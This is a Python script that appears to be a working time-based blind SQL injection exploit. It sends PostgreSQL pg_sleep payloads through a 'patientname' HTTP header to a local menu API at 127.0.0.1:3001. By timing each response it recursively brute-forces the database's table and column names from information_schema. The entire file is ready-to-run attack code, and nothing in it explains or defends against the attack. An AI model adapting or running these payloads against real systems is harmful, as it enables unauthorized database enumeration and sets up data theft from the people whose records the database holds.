import requests
import time
from typing import List

url = "http://127.0.0.1:3001/api/menu/2023-01-01"  # Base URL
# ? will be replaced in test (given enough parametes), + will be replaced by time to sleep
sql_find_table = "'; SELECT CASE WHEN(table_name ILIKE '?%' AND table_schema LIKE 'public') THEN pg_sleep(+) ELSE pg_sleep(0) END  FROM information_schema.tables --"
sql_confirm_table = "'; SELECT CASE WHEN(table_name ILIKE '?' AND table_schema LIKE 'public') THEN pg_sleep(+) ELSE pg_sleep(0) END  FROM information_schema.tables --"

sql_find_column = "'; SELECT CASE WHEN(t.table_name ILIKE '?' AND c.column_name ILIKE '?%') THEN pg_sleep(+) ELSE pg_sleep(0) END  FROM information_schema.tables t INNER JOIN information_schema.columns c ON c.table_name = t.table_name AND c.table_schema = t.table_schema --"
sql_confirm_column = "'; SELECT CASE WHEN(t.table_name ILIKE '?' AND c.column_name ILIKE '?') THEN pg_sleep(+) ELSE pg_sleep(0) END  FROM information_schema.tables t INNER JOIN information_schema.columns c ON c.table_name = t.table_name AND c.table_schema = t.table_schema --"


"""
Test specified sql query given the endpoint in 'url'.
Each '?' in sql_string will replaced by index correspoding to data in parameters.
'+' will be replaced by success_sleep_time.

Takes
sql_string to be injected
parametes to be inserted in sql_string
success_sleep_time time to let db sleep on true condition

Returns tuple[bool, List[str], float] 
if successfull
used parameters
exectutiontime
"""


def test(sql_string: str, parameters: List[str], success_sleep_time: str = "0.1") -> tuple[bool, List[str], float]:

    # Substitute ? for parameters
    for param in parameters:
        sql_string = sql_string.replace('?', param, 1)

    sql_string = sql_string.replace('+', str(success_sleep_time))

    # we are attacking via header patientname, inject sql_string
    headers = {
        'patientname': sql_string,
    }

    # measure time
    startTime = time.time()
    requests.request("GET", url, headers=headers)
    executionTime = (time.time() - startTime)

    # count overall calls
    global query_count
    query_count = query_count + 1

    # determine executionTime and if condition was true
    # you may have to adjust success_sleep_time to your usecase as network latancy and cpu power are different
    hit = executionTime > float(success_sleep_time)

    if (hit):
        print("Hit on: " + " ".join(parameters))

    return (hit, parameters, executionTime)


# A -> ['AA', 'AB', 'AC', ...]
def possible_mutation(text):
    res = []
    for i in range(26):
        res.append(text + chr(65 + i))
    return res

# If table Menu exists, M, Me, Men and Menu will be returned
def find_possible_tables(params):
    possible_param = []
    for param in params:
        res = test(sql_find_table, [param])
        if res[0]:  # if successful
            new_param = res[1][0]  # get firs param (tablename)
            possible_param.append(new_param)  # will be returned later
            possible_param.extend(find_possible_tables(
                possible_mutation(new_param)))  # check similar muteted table names, eg. A -> AA, AB, ..

    return possible_param

# Check if tables exists fr
def confirm_tables(params):
    print("confirming tables...")
    confirmed_params = []
    for param in params:
        res = test(sql_confirm_table, [param])
        if res[0]:
            confirmed_params.append(res[1])

    # essentially flatten list, nice to look and work with
    return sum(confirmed_params, [])


# same with columns, first get all possible partial names, then confirm
def find_possible_columns(tables):
    possible_columns = []
    for table in tables:
        possible_columns.extend(
            find_possible_columns_for(table, possible_mutation('')))

    return possible_columns


# find
def find_possible_columns_for(table, params):
    possible_param = []
    for param in params:
        p = [table, param]
        res = test(sql_find_column, p)
        if res[0]:
            possible_param.append(res[1])
            possible_param.extend(find_possible_columns_for(
                table, possible_mutation(res[1][1])))

    return possible_param


# confirm
def confirm_columns(possible_columns):
    print("confirming columns...")
    confirmed_params = []
    for params in possible_columns:
        res = test(sql_confirm_column, params)
        if res[0]:
            confirmed_params.append((res[1][0], res[1][1]))

    return confirmed_params


# lets start...
query_count = 0
s = time.time()

# find potential table names
startTime = time.time()
possible_tables = find_possible_tables(
    possible_mutation(''))  # starts with ['A', 'B', 'C', ...]
executionTime = (time.time() - startTime)
print("Runtime: " + str(executionTime))
print("possible tables: ", possible_tables)


# confirm tablenames
startTime = time.time()
confirmed_tables = confirm_tables(possible_tables)
executionTime = (time.time() - startTime)
print("Runtime: " + str(executionTime))
print("confirmed tables: ", confirmed_tables)


# find possible columnnames
startTime = time.time()
possible_columns = find_possible_columns(confirmed_tables)
executionTime = (time.time() - startTime)
print("Runtime: " + str(executionTime))
print("possible columns: ", possible_columns)


# confirm columnnames
startTime = time.time()
confirmed_columns = confirm_columns(possible_columns)
executionTime = (time.time() - startTime)
print("Runtime: " + str(executionTime))
print("confirmed columns: ", confirmed_columns)

# Wrap up
executionTime = (time.time() - s)
print("Runtime: " + str(executionTime))
print("query count: ", query_count)
